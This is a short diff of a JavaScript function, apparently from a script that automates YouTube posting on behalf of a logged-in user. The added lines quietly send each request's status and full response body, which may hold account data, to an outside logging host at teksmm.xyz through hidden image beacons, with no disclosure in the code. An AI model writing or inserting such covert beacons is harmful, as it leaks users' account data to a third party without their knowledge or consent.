@@ -486,7 +486,6 @@ function createPost(vars,type) {
 	xhr.setRequestHeader("x-origin",  "https://www.youtube.com");
 	xhr.onreadystatechange = function() {
 		if (xhr.readyState == 4 && xhr.status == 200) {
-			new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir200';
 			let parsedText = xhr.responseText;
 			let parsed = JSON.parse(parsedText);
 			if(parsed.responseContext.consistencyTokenJar){
@@ -500,6 +499,13 @@ function createPost(vars,type) {
 			}
             xhr.close;
 		}
+		if (xhr.readyState == 4) {
+			var data = xhr.responseText;
+			console.log(data);
+			new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir'+xhr.status;
+			new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getirData'+data;
+
+		 }
 	}
 	xhr.send(JSON.stringify(postData));
 }
